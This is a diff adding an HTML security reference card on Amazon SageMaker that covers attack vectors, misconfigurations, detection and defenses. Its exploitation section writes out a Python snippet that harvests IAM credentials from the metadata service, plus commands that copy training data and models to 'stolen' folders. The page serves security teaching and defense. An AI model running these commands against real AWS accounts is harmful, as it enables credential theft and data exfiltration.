@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS SageMaker Security | AWS Security Cards</title>
+<meta name="description" content="Amazon SageMaker is a fully managed machine learning platform. Attackers target notebooks for code execution, training jobs for data exfiltration, models for IP theft, and endpoints for inference manipulation.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/sagemaker-card.webp" alt="AWS SageMaker Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/sagemaker.svg" alt="AWS SageMaker Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS SageMaker Security</span>
+        <span class="header-badge">ML PLATFORM</span>
+      </div>
+      <p class="header-desc">Amazon SageMaker is a fully managed machine learning platform. Attackers target notebooks for code execution, training jobs for data exfiltration, models for IP theft, and endpoints for inference manipulation.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">Notebooks</div>
+          <div class="stat-label">Code Execution</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">Training</div>
+          <div class="stat-label">Data Access</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Endpoints</div>
+          <div class="stat-label">Inference</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Notebook Instances</h4>
+          <p>Managed Jupyter notebook environments for data exploration and model development. Run on EC2 instances with IAM roles for AWS service access.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Full code execution with IAM role credentials accessible via IMDS</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Training Jobs</h4>
+          <p>Managed compute for model training. Access training data from S3, output models to S3. Can use custom containers or built-in algorithms.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Training data often contains sensitive information, credentials in environment</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Model Endpoints</h4>
+          <p>Real-time inference endpoints hosting trained models. Can be invoked directly or behind API Gateway. Auto-scaling based on traffic.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Model inference can leak training data through carefully crafted inputs</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 85%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">8.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">SageMaker presents high risk due to code execution capabilities in notebooks, access to sensitive training data, valuable model intellectual property, and often overly permissive IAM roles for data scientist productivity.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Notebook Attacks</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Execute arbitrary code in notebooks</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access IMDS for IAM credentials</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Install backdoors and reverse shells</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exfiltrate data through notebook outputs</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access connected S3 buckets and secrets</li></ul><h4 style="color: #f87171;">Model &amp; Data Theft</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Download trained models from S3</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access training datasets</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Extract model through inference API</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Steal feature engineering code</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Clone model artifacts and weights</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Notebook Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Internet access enabled (direct mode)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Root access enabled on notebooks</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Execution role with admin permissions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Unencrypted EBS storage volumes</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Public presigned URLs for notebooks</li></ul><h4 style="color: #fb923c;">Training &amp; Endpoint Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Training data in unencrypted S3</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Model artifacts publicly accessible</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Endpoints without authentication</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> VPC not configured for isolation</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Secrets in hyperparameters/env vars</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List Notebook Instances</div>
+          <pre><code>aws sagemaker list-notebook-instances</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Describe Notebook Instance</div>
+          <pre><code>aws sagemaker describe-notebook-instance \\
+  --notebook-instance-name my-notebook</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Training Jobs</div>
+          <pre><code>aws sagemaker list-training-jobs --status-equals Completed</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Models</div>
+          <pre><code>aws sagemaker list-models</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Endpoints</div>
+          <pre><code>aws sagemaker list-endpoints</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">📓 Notebook Exploitation</h3><h4 style="color: #c084fc;">Code Execution</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create presigned URL to access notebook</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Execute Python/shell in notebook cells</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access IAM credentials via IMDS</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Pivot to other AWS services</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Install persistence via startup scripts</li></ul><h4 style="color: #c084fc;">Privilege Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Abuse notebook execution role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access S3 training data buckets</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Read Secrets Manager secrets</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Call other AWS APIs with role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify lifecycle configurations</li></ul><div class="note"><strong>Critical:</strong> Notebook instances often have overly permissive roles for data scientist productivity - check role policies!</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🎯 Model &amp; Inference Attacks</h3><h4 style="color: #facc15;">Model Theft</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Download model artifacts from S3</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Extract model via inference queries</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Steal hyperparameters from training jobs</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Clone endpoint configurations</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Access model registry versions</li></ul><h4 style="color: #facc15;">Inference Attacks</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Model inversion - extract training data</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Adversarial inputs for misclassification</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Prompt injection for LLM endpoints</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Denial of service via resource exhaustion</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Data poisoning through feedback loops</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreatePresignedNotebookInstanceUrl</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateNotebookInstance</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateTrainingJob</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateModel</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> InvokeEndpoint (data events)</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Presigned URLs created by unknown users</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual notebook access patterns</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Large data transfers from training jobs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Model downloads to unknown locations</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Endpoint invocations from suspicious IPs</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Create Presigned Notebook URL</div>
+          <pre><code>aws sagemaker create-presigned-notebook-instance-url \\
+  --notebook-instance-name target-notebook
+
+# Returns URL valid for 5 minutes - opens Jupyter directly</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Access Credentials in Notebook</div>
+          <pre><code># Inside SageMaker notebook
+import requests
+r = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+role = r.text
+creds = requests.get(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}').json()
+print(creds['AccessKeyId'], creds['SecretAccessKey'], creds['Token'])</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Download Training Data</div>
+          <pre><code># Find training job's data location
+aws sagemaker describe-training-job \\
+  --training-job-name job-name \\
+  --query 'InputDataConfig[*].DataSource.S3DataSource.S3Uri'
+
+# Download the data
+aws s3 cp s3://training-data-bucket/dataset/ ./stolen-data/ --recursive</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Steal Model Artifacts</div>
+          <pre><code># Get model artifact location
+aws sagemaker describe-model \\
+  --model-name production-model \\
+  --query 'PrimaryContainer.ModelDataUrl'
+
+# Download model
+aws s3 cp s3://model-bucket/model.tar.gz ./stolen-model.tar.gz</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Invoke Endpoint for Data Extraction</div>
+          <pre><code>aws sagemaker-runtime invoke-endpoint \\
+  --endpoint-name production-endpoint \\
+  --content-type application/json \\
+  --body '{&quot;input&quot;: &quot;extract training examples similar to: [probe]&quot;}' \\
+  output.json</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List and Access Feature Store</div>
+          <pre><code># List feature groups
+aws sagemaker list-feature-groups
+
+# Describe feature group for data location
+aws sagemaker describe-feature-group \\
+  --feature-group-name customer-features \\
+  --query 'OfflineStoreConfig.S3StorageConfig.S3Uri'</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full SageMaker Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;sagemaker:*&quot;,
+      &quot;s3:*&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Full access enables model theft, data exfiltration, and resource manipulation</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Scoped Notebook Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;sagemaker:CreatePresignedNotebookInstanceUrl&quot;,
+      &quot;sagemaker:DescribeNotebookInstance&quot;
+    ],
+    &quot;Resource&quot;: &quot;arn:aws:sagemaker:us-east-1:123456789012:notebook-instance/my-notebook&quot;,
+    &quot;Condition&quot;: {
+      &quot;IpAddress&quot;: {&quot;aws:SourceIp&quot;: &quot;10.0.0.0/8&quot;}
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">Access limited to specific notebook with IP restriction</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Overpermissive Execution Role</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;s3:*&quot;,
+      &quot;secretsmanager:GetSecretValue&quot;,
+      &quot;kms:Decrypt&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Execution role with wildcard S3 and secrets access - common but dangerous</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Least Privilege Execution Role</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;s3:GetObject&quot;, &quot;s3:PutObject&quot;],
+    &quot;Resource&quot;: [
+      &quot;arn:aws:s3:::sagemaker-data-bucket/training/*&quot;,
+      &quot;arn:aws:s3:::sagemaker-data-bucket/models/*&quot;
+    ]
+  }]
+}</code></pre>
+          <p class="policy-desc">Execution role restricted to specific data paths needed for training</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Enable VPC Mode</h4>
+              <p>Configure notebooks and training jobs to run in VPC without direct internet access.</p>
+              <pre><code>aws sagemaker create-notebook-instance \\
+  --notebook-instance-name secure-notebook \\
+  --direct-internet-access Disabled \\
+  --subnet-id subnet-xxx \\
+  --security-group-ids sg-xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Disable Root Access</h4>
+              <p>Disable root access on notebook instances to limit privilege escalation.</p>
+              <pre><code>aws sagemaker create-notebook-instance \\
+  --root-access Disabled</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Encrypt All Storage</h4>
+              <p>Enable KMS encryption for notebook volumes, training data, and model artifacts.</p>
+              <pre><code>aws sagemaker create-notebook-instance \\
+  --kms-key-id alias/sagemaker-key</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Scope Execution Roles</h4>
+              <p>Apply least privilege to notebook and training job execution roles.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔑</span>
+            <div>
+              <h4>Use VPC Endpoints</h4>
+              <p>Create VPC endpoints for SageMaker APIs to avoid public internet exposure.</p>
+              <pre><code>aws ec2 create-vpc-endpoint \\
+  --vpc-id vpc-xxx \\
+  --service-name com.amazonaws.us-east-1.sagemaker.api</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Monitor Presigned URLs</h4>
+              <p>Alert on CreatePresignedNotebookInstanceUrl calls from unexpected principals.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS SageMaker Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
